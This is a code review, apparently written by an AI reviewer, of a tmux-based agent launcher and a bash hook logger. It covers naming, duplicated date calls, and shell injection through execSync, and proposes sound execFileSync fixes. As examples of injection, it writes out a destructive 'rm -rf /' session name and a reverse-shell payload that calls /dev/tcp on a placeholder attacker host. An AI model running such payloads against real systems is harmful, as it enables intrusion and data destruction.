# Phase 1 Code Review: gsd-code-skill v4.0 Cleanup

**Reviewer:** Claude (code-reviewer)
**Date:** 2026-02-20
**Scope:** All Phase 1 artifacts — bin/hook-event-logger.sh, bin/launch-session.mjs, config/agent-registry.example.json, config/default-system-prompt.md, package.json, .gitignore, SKILL.md, README.md

---

## 1. Executive Summary

Phase 1 delivered a genuinely clean slate. The v1-v3 bash monolith is gone and what replaced it is well-structured, idiomatic Node.js ESM with self-explanatory naming throughout. The decision to rewrite from scratch rather than patch incrementally was the right call — there is no residual v1-v3 contamination in any file. The two most important artifacts (hook-event-logger.sh and launch-session.mjs) demonstrate different philosophies that are each appropriate to their context: the logger is a hardened bash utility that must never crash Claude Code, while the launcher is expressive ESM JavaScript with clear function boundaries.

The phase falls short in a handful of specific areas. `launch-session.mjs` has a meaningful shell injection surface that will become an operational problem once real agents with multi-line system prompts or unusual session names are wired in. The bash logger accumulates redundant `date -u` calls in what should be a single timestamp capture, and the `trap 'exit 0' ERR` pattern is a double-edged sword that deserves more precise scoping. These are not blocking issues at the Phase 1 scale, but they should be addressed before Phase 2 adds handlers that depend on the shared patterns established here.

Overall quality: **Good** — solid foundation with identified, fixable issues.

---

## 2. What Was Done Well

### 2.1 Self-Explanatory Naming (CLAUDE.md compliance)

`launch-session.mjs` is exemplary on naming. Every function name tells you what it does in plain English with no abbreviations:

```javascript
// bin/launch-session.mjs lines 29, 53, 76, 99, 112, 121, 127, 133
parseCommandLineArguments()
readAgentRegistry()
findAgentByIdentifier()
readSystemPromptFile()
checkTmuxSessionExists()
createTmuxSession()
sendTmuxKeys()
sleepSeconds()
```

Variable names are equally clear: `positionalArguments`, `namedArguments`, `agentIdentifier`, `systemPromptText`, `optionalFirstCommand`. This is exactly what CLAUDE.md demands and it makes the code readable without comments.

The bash logger follows the same principle: `HOOK_ENTRY_MS`, `STDIN_BYTE_COUNT`, `RAW_EVENTS_FILE`, `JSONL_LOCK_FILE` — all self-descriptive, no single-letter variables.

### 2.2 SRP — Each Function Does One Thing

`launch-session.mjs` has clean single-responsibility decomposition. `readAgentRegistry()` only reads and parses. `findAgentByIdentifier()` only searches and validates. `createTmuxSession()` only calls `tmux new-session`. There is no mixed-concern function in the file.

The bash logger similarly keeps each numbered step focused: read stdin, extract event name, detect session, log structured entry, append JSONL. No step does two things.

### 2.3 Idempotent Session Launch

```javascript
// bin/launch-session.mjs lines 169-172
if (checkTmuxSessionExists(sessionName)) {
  logWithTimestamp(`Session "${sessionName}" already exists. Attach with: tmux attach -t ${sessionName}`);
  process.exit(0);
}
```

Exiting 0 when the session already exists is the correct choice. Hook event handlers will call this repeatedly and must not fail on re-invocation. This is a mature operational decision that shows awareness of the eventual deployment context.

### 2.4 Loud Failure for Disabled Agents

```javascript
// bin/launch-session.mjs lines 89-94
if (!matchingAgent.enabled) {
  throw new Error(
    `Agent "${agentIdentifier}" is disabled (enabled: false) in the registry.\n` +
    `Set enabled: true in config/agent-registry.json to activate this agent.`
  );
}
```

The error message includes the exact fix. This is better than a generic "operation not permitted" error and reduces debugging time significantly.

### 2.5 ESM bootstrap via import.meta.url

```javascript
// bin/launch-session.mjs line 20
const SKILL_ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
```

This is the correct 2025/2026 ESM pattern for resolving the script's location. It mirrors the bash `BASH_SOURCE[0]` pattern from the logger, making both files follow the same "self-contained bootstrapping" philosophy regardless of the runtime. The constant is named `SKILL_ROOT` (not `__dirname` or `dir`) — clear intent.

### 2.6 Safety-First Trap in Logger

```bash
# bin/hook-event-logger.sh line 22
trap 'exit 0' ERR
```

Claude Code would surface any hook script exit code != 0 as an error to the user. A debug logger failing should never interrupt a coding session. The intent here is correct: the logger must be transparent. (See Section 3.1 for the nuance on placement.)

### 2.7 Atomic JSONL Append via flock

```bash
# bin/hook-event-logger.sh lines 82-87
if [ -n "$JSONL_RECORD" ]; then
  (
    flock -x 9
    printf '%s\n' "$JSONL_RECORD" >> "$RAW_EVENTS_FILE"
  ) 9>"$JSONL_LOCK_FILE" 2>/dev/null || true
fi
```

Using `flock` for the JSONL file is correct. Hook events can fire in rapid succession from multiple Claude Code subagents. Without exclusive locking, concurrent appends would corrupt JSONL records. This is a correctness requirement that was recognized and handled properly.

### 2.8 Agent Registry Schema Design

The v4.0 schema (`agents: []` only, no `hook_settings`, no `global_status_*`) is minimal and right. The old v1-v3 schema carried `auto_wake`, `topic_id`, `claude_resume_target`, and `claude_post_launch_mode` — none of which belong in a registry. The new schema contains exactly what an event handler needs: where the agent lives, whether it's active, and how to reach its session. Clean.

The decision to use `system_prompt_file` (file reference) rather than inlining the prompt text in JSON is excellent. It keeps the registry lean and allows agents to share or diverge on system prompts without touching registry configuration.

### 2.9 Execution Quality — Atomic Commits and Plan Compliance

Every task was committed individually with descriptive messages following the `type(phase-plan): description` format. The plan was executed exactly as written (Plan 01 zero deviations; Plan 02 one Rule 1 auto-fix for a pre-existing file rename). The verification and UAT reports are thorough: 12/12 must-haves verified, 6/6 UAT tests passed. This is the execution quality standard the rest of the phases should match.

---

## 3. What Could Be Improved

### 3.1 hook-event-logger.sh: Redundant date -u Calls (Lines 46-52)

**Issue:** The structured log block calls `date -u +'%Y-%m-%dT%H:%M:%SZ'` six separate times:

```bash
# bin/hook-event-logger.sh lines 45-53
{
  printf '[%s] ===== HOOK EVENT: %s =====\n' "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" "$EVENT_NAME"
  printf '[%s] timestamp: %s\n' "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" "$(date -u +'%Y-%m-%dT%H:%M:%SZ')"
  printf '[%s] session: %s\n' "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" "$SESSION_NAME"
  printf '[%s] stdin_bytes: %d\n' "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" "$STDIN_BYTE_COUNT"
  printf '[%s] payload:\n' "$(date -u +'%Y-%m-%dT%H:%M:%SZ')"
  ...
```

Line 47 calls `date -u` twice in one `printf` to print "timestamp" followed by... the same timestamp again.

**Fix:** Capture the log-block timestamp once and reuse it:

```bash
LOG_BLOCK_TIMESTAMP=$(date -u +'%Y-%m-%dT%H:%M:%SZ')
{
  printf '[%s] ===== HOOK EVENT: %s =====\n' "$LOG_BLOCK_TIMESTAMP" "$EVENT_NAME"
  printf '[%s] session: %s\n' "$LOG_BLOCK_TIMESTAMP" "$SESSION_NAME"
  printf '[%s] stdin_bytes: %d\n' "$LOG_BLOCK_TIMESTAMP" "$STDIN_BYTE_COUNT"
  printf '[%s] payload:\n' "$LOG_BLOCK_TIMESTAMP"
  printf '%s' "$STDIN_JSON" | jq '.' 2>/dev/null || printf '%s' "$STDIN_JSON"
  printf '[%s] ===== END EVENT: %s =====\n' "$LOG_BLOCK_TIMESTAMP" "$EVENT_NAME"
} >> "$GSD_HOOK_LOG" 2>/dev/null || true
```

Additionally, `HOOK_ENTRY_MS` (line 26) is captured but never used. Either use it in the JSONL record (it is more precise than a second-precision timestamp) or remove it.

### 3.2 hook-event-logger.sh: trap Scope Too Broad (Line 22)

**Issue:** `trap 'exit 0' ERR` on line 22 applies to the entire script, including the stdin read on line 25. If `cat` fails (closed pipe, broken stdin), the trap silences the error and the script exits 0 having read nothing. Subsequent logic then operates on an empty `STDIN_JSON` and writes a garbage JSONL record.

**Fix:** Scope the trap. Read stdin before setting the trap, or set the trap only around the I/O sections that must not crash Claude Code:

```bash
# 1. Consume stdin immediately and unconditionally (before trap)
STDIN_JSON=$(cat)

# 2. Now set the safety trap — from here forward, errors exit 0
trap 'exit 0' ERR
```

This preserves the intent (logger never crashes Claude Code) while allowing stdin failures to surface properly during development.

### 3.3 launch-session.mjs: Shell Injection via Unsanitized Session Names (Lines 114, 122, 128)

**Issue:** Session names from the registry are interpolated directly into shell commands without quoting or validation:

```javascript
// bin/launch-session.mjs line 114
execSync(`tmux has-session -t ${sessionName} 2>/dev/null`, { stdio: 'pipe' });

// bin/launch-session.mjs line 122
execSync(`tmux new-session -d -s ${sessionName} -c ${workingDirectory}`, { stdio: 'inherit' });

// bin/launch-session.mjs line 128
execSync(`tmux send-keys -t ${sessionName} ${JSON.stringify(keysToSend)} Enter`, { stdio: 'inherit' });
```

A session name like `gideon; rm -rf /` would be executed by the shell. The `workingDirectory` path has the same exposure. While the registry is an admin-controlled file, this is still a bad pattern — it makes the code fragile against accidentally malformed configs and sets a precedent for future code.

**Fix:** Use `execFileSync` with an argument array instead of template string commands:

```javascript
import { execFileSync } from 'node:child_process';

function checkTmuxSessionExists(sessionName) {
  try {
    execFileSync('tmux', ['has-session', '-t', sessionName], { stdio: 'pipe' });
    return true;
  } catch {
    return false;
  }
}

function createTmuxSession(sessionName, workingDirectory) {
  execFileSync('tmux', ['new-session', '-d', '-s', sessionName, '-c', workingDirectory], {
    stdio: 'inherit',
  });
}

function sendTmuxKeys(sessionName, keysToSend) {
  execFileSync('tmux', ['send-keys', '-t', sessionName, keysToSend, 'Enter'], {
    stdio: 'inherit',
  });
}
```

This eliminates shell injection entirely. `execFileSync` bypasses the shell and passes arguments as an array.

### 3.4 launch-session.mjs: System Prompt Passed as Shell Argument (Line 180)

**Issue:** The system prompt text is read from a file and embedded directly into a shell command string:

```javascript
// bin/launch-session.mjs line 180
sendTmuxKeys(sessionName, `claude --dangerously-skip-permissions --system-prompt "${systemPromptText}"`);
```

This has multiple failure modes:
1. The system prompt contains a `"` character — breaks the shell quoting.
2. The system prompt contains `$variable` syntax — evaluated by the shell.
3. The system prompt contains newlines — `send-keys` will interpret the newline as Enter and submit the command mid-prompt.
4. The system prompt contains shell metacharacters (backticks, `!` in history-enabled shells) — unintended execution.

`config/default-system-prompt.md` already contains backticks in the GSD command examples (e.g., `/gsd:resume-work`). Backtick-free today, but the content is user-editable.

**Fix 1 (immediate):** Write the system prompt to a temp file and pass `--system-prompt-file` if Claude Code supports that flag. This avoids the quoting problem entirely.

**Fix 2 (safe fallback):** Use `execFileSync` for `send-keys` with the full command as a single array element (tmux passes it as-is to the shell, so you still need shell-safe content, but at least you control quoting):

```javascript
function buildClaudeStartCommand(systemPromptText) {
  // Shell-escape the prompt text to avoid injection through quotes or metacharacters
  const escapedPrompt = systemPromptText.replace(/'/g, `'\\''`);
  return `claude --dangerously-skip-permissions --system-prompt '${escapedPrompt}'`;
}
```

Single-quote escaping handles `"`, `$`, and most metacharacters. Newlines remain a concern — the system prompt should be validated to contain no raw newlines if it is passed via `send-keys`.

### 3.5 launch-session.mjs: sleepSeconds Uses execSync (Line 134)

**Issue:**

```javascript
// bin/launch-session.mjs lines 133-135
function sleepSeconds(numberOfSeconds) {
  execSync(`sleep ${numberOfSeconds}`);
}
```

Spawning a child process to sleep is heavy and platform-dependent (`sleep` may not accept fractional seconds on all systems, though this is Linux-specific per CLAUDE.md). More importantly it blocks the Node.js event loop with a shell call when Node.js has built-in timer APIs.

**Fix:** Use `Atomics.wait` for a synchronous sleep or refactor `main()` to be `async` and use a Promise-based timer:

```javascript
// Async approach (preferred — removes all execSync-for-waiting)
async function sleepMilliseconds(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

// In main():
async function main() {
  // ...
  if (optionalFirstCommand !== null) {
    await sleepMilliseconds(TMUX_SESSION_STARTUP_DELAY_SECONDS * 1000);
    sendTmuxKeys(sessionName, optionalFirstCommand);
  }
}
```

The constant should then be renamed `TMUX_SESSION_STARTUP_DELAY_MILLISECONDS = 3000` for precision.

### 3.6 launch-session.mjs: Argument Parser Reinvention (Lines 29-51)

**Issue:** The argument parser is 23 lines of a while-loop reimplementing what Node.js provides natively:

```javascript
// bin/launch-session.mjs lines 29-51
function parseCommandLineArguments(rawArguments) {
  const positionalArguments = [];
  const namedArguments = {};
  let argumentIndex = 0;
  while (argumentIndex < rawArguments.length) {
    // ...
  }
  return { positionalArguments, namedArguments };
}
```

Node.js 18.3+ ships `node:util` `parseArgs()` which handles this correctly with less code and better edge cases (boolean flags, multiple values, etc.):

```javascript
import { parseArgs } from 'node:util';

function parseCommandLineArguments(rawArguments) {
  const { values, positionals } = parseArgs({
    args: rawArguments,
    options: {
      workdir: { type: 'string' },
      'first-command': { type: 'string' },
    },
    allowPositionals: true,
    strict: false,
  });
  return { positionalArguments: positionals, namedArguments: values };
}
```

This is DRY (don't rewrite what the stdlib provides) and handles edge cases like missing values, boolean flags, and duplicate options correctly.

### 3.7 launch-session.mjs: --dangerously-skip-permissions Hardcoded (Line 180)

**Issue:** The `--dangerously-skip-permissions` flag is hardcoded in the launch command:

```javascript
// bin/launch-session.mjs line 180
sendTmuxKeys(sessionName, `claude --dangerously-skip-permissions --system-prompt "${systemPromptText}"`);
```

This flag grants the agent unrestricted filesystem and command execution access. It is appropriate for Gideon (the orchestrator) but may not be appropriate for all agents. Hardcoding it prevents launching agents in safer modes.

**Fix:** Add an optional field to the agent registry schema:

```json
{
  "agent_id": "gideon",
  "skip_permissions": true
}
```

And conditionally include the flag:

```javascript
const skipPermissionsFlag = agentConfiguration.skip_permissions ? '--dangerously-skip-permissions' : '';
```

### 3.8 agent-registry.example.json: _comment Anti-Pattern (Lines 2, 5, 8, etc.)

**Issue:** The example file uses `_comment` and `_comment_field_name` keys for documentation:

```json
{
  "_comment": "Copy this file to agent-registry.json and fill in real values...",
  "agents": [
    {
      "_comment_agent_id": "Unique identifier for this agent...",
      "agent_id": "gideon",
```

JSON has no comment syntax. The `_comment_*` pattern works but has problems:
1. Any code that iterates over agent object keys will encounter `_comment_*` keys unless explicitly filtered.
2. The second agent entry (warden, lines 19-25) has no `_comment_*` keys at all — inconsistent documentation.
3. Tooling (schema validators, linters) may flag unknown keys.

**Alternative 1 (preferred):** Use a `README` or `SCHEMA.md` file in `config/` to document the schema. Keep the example JSON clean:

```json
{
  "agents": [
    {
      "agent_id": "gideon",
      "enabled": true,
      "session_name": "gideon-main",
      "working_directory": "/home/forge/.openclaw/workspace",
      "openclaw_session_id": "00000000-0000-0000-0000-000000000001",
      "system_prompt_file": "config/default-system-prompt.md"
    }
  ]
}
```

**Alternative 2:** Use JSON5 or JSONC (JSON with comments) format, rename to `.jsonc`, and add tooling support.

### 3.9 package.json: Missing Fields (All Lines)

**Issue:** The package.json is minimal to the point of being incomplete:

```json
{
  "name": "gsd-code-skill",
  "version": "4.0.0",
  "type": "module",
  "description": "Event-driven hook system for Claude Code agent lifecycle management",
  "private": true
}
```

Missing fields that matter for a Node.js project:
- `"engines": { "node": ">=22" }` — the skill depends on Node.js 22+ (ESM, `parseArgs`, `import.meta.url`). Without this, `npm install` on Node 18 may produce confusing errors.
- `"bin"` — `launch-session.mjs` is intended to be invoked as a CLI tool. Adding `"bin": { "launch-session": "bin/launch-session.mjs" }` makes it runnable via `npx` and documents the entry point.
- `"scripts"` — even a stub `"test": "echo 'No tests yet'"` or `"lint": "node --check bin/*.mjs"` documents what tooling exists.
- `"license": "UNLICENSED"` — `private: true` implies it, but explicit is clearer.

### 3.10 .gitignore: Incomplete Coverage

**Issue:** The `.gitignore` only covers two entries:

```
config/agent-registry.json
logs/
```

Missing standard entries for a Node.js project:
- `node_modules/` — not present now, but will be once any package is installed in Phase 2+
- `.env` and `.env.*` — common pattern for secrets in Node.js projects
- `*.lock` — the v1-v3 lock file pattern (`recovery-registry.json.lock`) was explicitly in the old gitignore; the v4.0 gitignore removed it. If flock-based lock files are ever created outside `logs/`, they would be committed accidentally.

The current `.gitignore` is functional for Phase 1 but will need expansion before package installation in Phase 2.

### 3.11 SKILL.md / README.md: Planned Structure vs Reality

**Issue:** `README.md` lists a planned directory structure that includes `events/stop/handler.js` and similar files:

```
events/
  stop/         handler.js, prompt.md
  notification/ handler.js, prompt.md
```

These files do not exist yet — README describes the target state, not the current state. This is technically accurate (it's labeled as planned) but creates a discoverability gap: a developer reading README expects the structure to be real.

**Fix:** Separate "current structure" from "target structure" with clear headings, or add a "Status" note that the events/ directory is currently empty.

`SKILL.md` has the same issue — it omits `bin/launch-session.mjs` from the Scripts section, listing only `hook-event-logger.sh`.

### 3.12 default-system-prompt.md: Missing Context

**Issue:** The default system prompt mentions GSD slash commands but provides no context about what the agent's role or environment is:

```markdown
This Claude Code session uses the GSD (Get Shit Done) workflow for project management.
```

Agents launched with this prompt will know the commands but not the operational context (OpenClaw system, tmux environment, which agent they are, what projects they manage). The prompt is functional as a stub but will need substantial content before any agent launched via `launch-session.mjs` can operate effectively.

This is a Phase 1 decision (stub prompt, details deferred), so it is not a fault — but it should be flagged in the plan for Phase 2 or Phase 3 to address.

---

## 4. Security Concerns

### 4.1 Shell Injection via execSync Template Strings — HIGH

As described in Section 3.3 and 3.4, every `execSync` call in `launch-session.mjs` constructs shell commands via template string interpolation without sanitization. The affected lines:

- Line 114: `tmux has-session -t ${sessionName}`
- Line 122: `tmux new-session -d -s ${sessionName} -c ${workingDirectory}`
- Line 128: `tmux send-keys -t ${sessionName} ${JSON.stringify(keysToSend)} Enter`
- Line 180: `claude --dangerously-skip-permissions --system-prompt "${systemPromptText}"`

**Severity:** Medium-High. The registry is admin-controlled (not user-controlled input), so exploitation requires an attacker to already have write access to `config/agent-registry.json`. However:
1. The system prompt file is user-editable and could contain shell metacharacters unintentionally.
2. The `--first-command` CLI argument (line 185) is passed directly from the command line to `sendTmuxKeys` — this is fully user-controlled and could contain shell metacharacters.
3. Hardcoded patterns become templates for future code — future developers may copy this pattern for user-controlled inputs.

**Remediation:** Switch to `execFileSync` with argument arrays (see Section 3.3).

### 4.2 --dangerously-skip-permissions Hardcoded — MEDIUM

The flag grants unrestricted system access to every launched agent regardless of their role. An attacker who can send a malicious first command (via `--first-command`) to a session running with this flag has full system access.

**Severity:** Medium. Mitigated by the fact that `launch-session.mjs` is an admin tool run by the forge user, not a public-facing service. But the flag should be per-agent configurable (see Section 3.7).

### 4.3 First-Command Injection — MEDIUM

The `--first-command` argument is accepted from the CLI and sent directly to the tmux session via `sendTmuxKeys`. Since `sendTmuxKeys` uses template string interpolation (injection risk from Section 3.3), a crafted `--first-command` value could escape the `JSON.stringify` quoting:

```bash
node bin/launch-session.mjs gideon --first-command '"; bash -i >& /dev/tcp/attacker/9001 0>&1 #'
```

With `execFileSync`, this becomes safe — tmux receives the argument verbatim as the string to type, not a shell command.

### 4.4 Log Injection — LOW

`debug_log()` in the bash logger writes unsanitized `$EVENT_NAME` to the log file. A crafted hook payload could set `hook_event_name` to a multi-line string containing terminal escape sequences. This is a low-severity information integrity issue — logs could be visually corrupted — not a code execution risk.

---

## 5. Best Practices Audit

### 5.1 CLAUDE.md Compliance

| Rule | Status | Notes |
|------|--------|-------|
| DRY — no repeated code | PARTIAL | `date -u` called 6x in logger (Section 3.1); `jq -cn` block duplicated for valid/invalid JSON (lines 65-79) |
| SRP — single responsibility | PASS | All functions have clear single purpose |
| Self-explanatory names, no abbreviations | PASS | No abbreviations found; all names read as English phrases |
| `set -euo pipefail` | PASS | Line 2 of hook-event-logger.sh |
| Timestamps in logs | PASS | Both scripts timestamp all output |
| `chmod +x` | PASS | Both executables are +x per UAT/verification |

### 5.2 Node.js ESM Best Practices (2025+)

| Practice | Status | Notes |
|----------|--------|-------|
| `import.meta.url` for path resolution | PASS | Line 20 |
| Named imports from `node:` prefix | PASS | All imports use `node:fs`, `node:path`, etc. |
| `execFileSync` over `execSync` for commands | FAIL | All tmux calls use `execSync` with template strings |
| `parseArgs` from `node:util` | FAIL | Custom parser instead of stdlib |
| Async-first I/O | PARTIAL | `sleepSeconds` via `execSync` instead of `async/await` |
| Error messages include remediation steps | PASS | All `throw new Error()` messages include fix instructions |

### 5.3 Bash Best Practices

| Practice | Status | Notes |
|----------|--------|-------|
| `set -euo pipefail` | PASS | Line 2 |
| Quote all variables | PASS | All `$VAR` usages are quoted |
| No hardcoded paths | PASS | All paths derived from `SKILL_ROOT` |
| ShellCheck compliance | LIKELY — not verified | No shellcheck run in CI; `flock` usage is non-POSIX (Linux-only) |
| Prefer `printf` over `echo` | PASS | All output uses `printf` |
| Capture all stdin before processing | PASS | Line 25: `STDIN_JSON=$(cat)` before any processing |

### 5.4 Claude Code Hook System Patterns

| Pattern | Status | Notes |
|---------|--------|-------|
| Hook scripts exit 0 on logger errors | PASS | `trap 'exit 0' ERR` |
| Hook scripts read stdin immediately | PASS | First operation after bootstrapping |
| Per-session log separation | PASS | `${SESSION_NAME}.log` pattern |
| JSONL for structured event storage | PASS | `*-raw-events.jsonl` pattern |
| No blocking operations in hook path | PARTIAL | `flock -x` could block if another process holds lock |

---

## 6. If I Were Refactoring

### 6.1 The Bash Logger vs a Node.js Logger

The current logger is bash because it was inherited from v1-v3. A Node.js logger written in ESM would:
- Eliminate the `date -u` redundancy problem (single `new Date().toISOString()`)
- Remove the `jq` dependency (use `JSON.parse/JSON.stringify`)
- Handle the JSONL atomic append via `node:fs` `appendFileSync` (simpler than flock, though not as atomic)
- Enable shared `logWithTimestamp` from `lib/` rather than per-script reimplementation

**Counter-argument for keeping bash:** Hook scripts must be installable without npm install. A Node.js logger would require the ESM module system but adds no external dependencies (only `node:*` builtins), so this concern does not apply here. The main reason to keep bash is convention: hook scripts are typically bash in Claude Code projects. For a purely debug logger with no registry lookups, bash is fine.

**Verdict:** Keep bash for the logger. But extract the timestamp capture into a single variable (Section 3.1 fix) and scope the trap properly (Section 3.2 fix). If in Phase 2 the shared `lib/` grows a `logger.mjs`, consider migrating then.

### 6.2 Session Launcher Architecture

`launch-session.mjs` is 191 lines doing well-scoped work. The main refactoring targets are:
1. Switch all `execSync` calls to `execFileSync` (Section 3.3) — eliminates injection risk and is architecturally cleaner
2. Make `main()` async and use `setTimeout` instead of `execSync('sleep N')` (Section 3.5)
3. Use `node:util parseArgs` instead of the custom parser (Section 3.6)
4. Add `skip_permissions` to the registry schema (Section 3.7)

None of these require architectural changes — they are in-place improvements to the existing 191-line file.

### 6.3 Registry Schema Alternatives

The `_comment` pattern in `agent-registry.example.json` could be replaced by:
1. A `config/SCHEMA.md` documentation file (preferred — JSON stays clean)
2. JSON Schema (`.schema.json`) for validation tooling
3. Moving to JSONC (JSON with comments) if Node.js tooling supports it natively

For Phase 1 scope, `_comment` is acceptable. For Phase 2+ when handlers start reading registry fields programmatically, the `_comment_*` keys should be filtered or removed from the example file.

### 6.4 Cross-Platform Concerns

`PROJECT.md` states: "Cross-platform: works on Windows, macOS, Linux". Phase 1 has the following platform dependencies:
- `bin/hook-event-logger.sh` — bash only, Linux/macOS. `flock` is Linux-only (GNU coreutils).
- `bin/launch-session.mjs` — `tmux` is Linux/macOS only. `execSync('sleep N')` uses the Unix `sleep` command.
- `config/` — no platform dependencies.

If Windows support is a real requirement, the entire hook delivery system needs to be Node.js (not bash), and tmux needs to be replaced with a cross-platform terminal multiplexer or a different session management approach. Given that OpenClaw runs on Ubuntu 24 (CLAUDE.md: "Host: Ubuntu 24") and the `SKILL.md` metadata explicitly lists `"os":["linux"]`, Windows support may be aspirational rather than required. This tension between the PROJECT.md claim and the SKILL.md metadata should be resolved — either update PROJECT.md to say "linux" or plan platform abstraction layers.

---

## 7. Long-Run Benefits

### 7.1 ESM Foundation for Shared Library

`package.json` with `"type": "module"` means every `.mjs` file in the project can `import` from every other `.mjs` file without configuration. When Phase 2 creates `lib/registry.mjs`, `lib/logger.mjs`, and `lib/delivery.mjs`, event handlers in `events/*/handler.mjs` can import them with:

```javascript
import { findAgentByIdentifier } from '../../lib/registry.mjs';
```

This is the correct ESM pattern and it works because Phase 1 established `type: module` in `package.json`. Without this, every file would need to use `.mjs` extensions in import paths OR rely on CJS `require()`. Phase 1 made the right call early.

### 7.2 Agent Registry as Handler Config Backbone

The v4.0 schema (`agent_id`, `enabled`, `session_name`, `working_directory`, `openclaw_session_id`, `system_prompt_file`) is exactly what event handlers in Phases 2-4 need. The `PostToolUse` handler will need `openclaw_session_id` for delivery. The `Stop` handler will need `session_name` to detect which agent stopped. The `Notification` handler will need `working_directory`. The schema is already right — no migration required between phases.

### 7.3 Self-Contained Bootstrapping Portability

Both scripts resolve `SKILL_ROOT` from their own location rather than relying on environment variables or installation paths. This means:
- The skill can be cloned to any path and work without reconfiguration
- `git clone` + `npm install` (when needed) is the complete setup
- No `source /path/to/env.sh` ceremony before running commands

This pattern should be enforced for every script added in Phases 2-5. `lib/` modules will import from relative paths; event handlers will import from `../../lib/`. The self-contained pattern scales.

### 7.4 bin/ vs lib/ vs events/ Separation

The directory separation established in Phase 1 creates clear boundaries:
- `bin/` — executables called directly (CLI tools, hook scripts). No shared state.
- `lib/` — importable modules. No direct execution. Pure functions.
- `events/` — one folder per Claude Code hook event. Each folder is self-contained (handler + prompt).
- `config/` — runtime configuration (gitignored secrets + committed examples).

This structure means a developer adding a new event handler knows exactly where it goes and what it can import. The boundary is enforced by convention, not by a module system. Phase 2-5 should respect this — no business logic in `bin/`, no I/O side effects in `lib/`, no cross-event handler imports.

### 7.5 Idempotent Operations as a Design Principle

The `checkTmuxSessionExists` idempotency (Section 2.3) and the `enabled: false` loud-failure pattern (Section 2.4) establish operational expectations for future phases. Event handlers should be similarly idempotent — firing twice on the same event should be safe. This is a Phase 1 implicit contract that Phases 2-5 should make explicit in their handler implementations.

---

## 8. Scores

### Code Quality: 4/5

Clean structure, readable functions, no dead code. Deductions for: redundant `date -u` calls in the logger block, `execSync` template string pattern in the launcher, and `sleepSeconds` via shell.

### Naming Conventions: 5/5

Exemplary compliance with CLAUDE.md. Every function and variable name in both scripts reads as a plain English phrase with no abbreviations. This is the standard for the project.

### Error Handling: 4/5

Good coverage in the launcher — every error path has a descriptive message with remediation instructions. The bash logger uses `|| true` and `2>/dev/null` defensively throughout. Deductions for: `trap 'exit 0' ERR` scoping (catches errors before stdin is read), missing handling for `--first-command` containing newlines in the launcher.

### Security: 2/5

The shell injection surface in `launch-session.mjs` is the primary concern. Every `execSync` call is vulnerable in principle; the system prompt injection (Section 3.4) and first-command injection (Section 4.3) are the highest-risk vectors. This score reflects that the vulnerabilities are identifiable, reproducible, and fixable — not that exploitation is currently easy. Phase 2 should address these before adding more handlers that call similar patterns.

### DRY/SRP: 4/5

SRP is well-applied throughout. DRY has two violations: the `date -u` repetition in the logger (6 calls instead of 1) and the near-identical `jq -cn` block duplicated for valid/invalid JSON paths in the logger (lines 65-79 vs same with `--arg payload` vs `--argjson payload`).

### Future-Proofing: 4/5

ESM foundation, clean registry schema, self-contained bootstrapping, and explicit directory conventions all set future phases up well. Deductions for: `--dangerously-skip-permissions` hardcoded (limits agent role diversity in later phases), the cross-platform tension (bash + flock + tmux are Linux-only despite PROJECT.md claiming cross-platform).

### Documentation: 3/5

`SKILL.md` omits `launch-session.mjs` from its Scripts section. `README.md` lists a planned structure that does not exist yet without marking it clearly as future/planned. `default-system-prompt.md` is a stub that provides no agent-specific context. The code comments in both scripts are good, but the project-level documentation needs an accuracy pass before Phase 2 begins.

---

## Summary Table

| File | Key Strength | Key Issue | Priority Fix |
|------|-------------|-----------|-------------|
| `bin/hook-event-logger.sh` | Safety trap, flock atomicity | 6x redundant `date -u`, trap scope too broad | Capture timestamp once; move trap after stdin read |
| `bin/launch-session.mjs` | Idempotent, self-explanatory naming | Shell injection via `execSync` template strings | Switch to `execFileSync` with arg arrays |
| `config/agent-registry.example.json` | Clean v4.0 schema | `_comment_*` keys pollute JSON objects | Move field docs to `config/SCHEMA.md` |
| `config/default-system-prompt.md` | Functions as stub | No agent context, no identity | Expand in Phase 2 or Phase 3 |
| `package.json` | `type: module` establishes ESM | Missing `engines`, `bin`, `scripts` | Add `engines: { node: ">=22" }` |
| `.gitignore` | Protects registry secrets | Missing `node_modules/`, `.env` | Add before Phase 2 npm install |
| `SKILL.md` | Clean v4.0 frontmatter | Missing `launch-session.mjs` from Scripts | Add launcher entry |
| `README.md` | Honest about v4.0 status | Planned structure listed as current | Separate current vs target structure |
